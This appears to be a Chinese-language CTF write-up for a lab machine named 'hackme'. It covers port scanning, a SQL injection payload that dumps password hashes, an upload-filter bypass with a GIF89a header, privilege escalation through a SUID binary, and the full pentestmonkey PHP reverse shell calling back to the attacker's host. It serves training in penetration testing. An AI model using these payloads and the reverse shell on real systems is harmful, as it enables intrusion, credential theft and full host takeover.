# 信息搜集

1、端口探测

```bash
└─# nmap -A -sVC -O -p- 192.168.0.102 -oA namp.txt
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6ba824d6092fc99a8eabbc6e7d4eb9ad (RSA)
|   256 abe84f5338062c6af392e3974a0e3ed1 (ECDSA)
|_  256 327690b87dfca4326310cd676149d6c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.34 (Ubuntu)
MAC Address: 00:0C:29:21:A4:F2 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2、80 端口简单探测

```bash
└─# nikto -host 192.168.0.102

---------------------------------------------------------------------------
+ Server: Apache/2.4.34 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.34 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ 8102 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-06-30 08:24:38 (GMT-4) (24 seconds)
---------------------------------------------------------------------------
```

# web打点

## SQL注入

前台注册一个账号后，看看功能点

<img src=".\图片\Snipaste_2023-06-30_20-37-39.png" alt="Snipaste_2023-06-30_20-37-39" style="zoom:80%;" />

还是 mysql 注入的 information_schema 的那一套

最后 payload 是

```
 -1' union select group_concat(user),group_concat(pasword),3 from users#
```

得到

```
user1,user2,user3,test,superadmin,test1,admin	5d41402abc4b2a76b9719d911017c592,6269c4f71a55b24bad0f0267d9be5508,0f359740bd1cda994f8b55330c86d845,05a671c66aefea124cc08b76ea6d30bb,2386acb2cf356944177746fc92523983,05a671c66aefea124cc08b76ea6d30bb,e10adc3949ba59abbe56e057f20f883e	
```

md5 解密最重要的 `superadmin` 的密码

```
superadmin:Uncrackable
```

管理员登录，看到一个文件上传功能点

<img src=".\图片\Snipaste_2023-06-30_20-44-20.png" alt="Snipaste_2023-06-30_20-44-20" style="zoom:80%;" />

## 文件上传getshell

测试上传，在 `shell.php` 开头加入 `GIF89a`，脚本是在浏览器插件 hacktools 里找的，当然也可以 goolge

```php
GIF89a
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '192.168.0.103';  // You have changed this
  $port = 1234;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
 
```

访问触发 反弹shell

```http
http://192.168.0.102/uploads/shell.php
```

```bash
└─# nc -lvvp 1234                                                                                                                                             1 ⨯
listening on [any] 1234 ...
connect to [192.168.0.103] from 192.168.0.102 [192.168.0.102] 58118
Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:50:16 up 33 min,  0 users,  load average: 0.26, 0.08, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ export TERM=xterm
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@hackme:/$ whoami
whoami
www-data
```

# 提权

查找 suid 权限的文件

```bash
find / -perm -u=s -type f 2>dev/null

/home/legacy/touchmenot
```

```bash
www-data@hackme:/home/legacy$ ls -al
ls -al
total 20
drwxr-xr-x 2 root root 4096 Mar 26  2019 .
drwxr-xr-x 4 root root 4096 Mar 26  2019 ..
-rwsr--r-x 1 root root 8472 Mar 26  2019 touchmenot
```

kali 下载  `touchmenot` ，并查看

```
python -m SimpleHTTPServer 8888
```

```
└─# wget http://192.168.0.102:8888/touchmenot
```

```bash
└─# file touchmenot 
touchmenot: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3ff194cb73ad46fb725445a4a8992494e7110a1c, not stripped
                                                                                                                                                                  
┌──(root💀kali)-[~/hackme1]
└─# strings touchmenot 
```

没整明白，可以放入 ida 里看看，这里我就在靶机里直接运行看看结果

结果直接便 root 权限了，不纠结了，靶场作者为了降低难度罢了

```bash
www-data@hackme:/$ ./home/legacy/touchmenot
.//home/legacy/touchmenot
root@hackme:/# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@hackme:/# cd /root
cd /root
root@hackme:/root# ls
ls
snap
```

# 总结

文件上传改了文件头几个字节为图片专有的，如 `GIF89a`
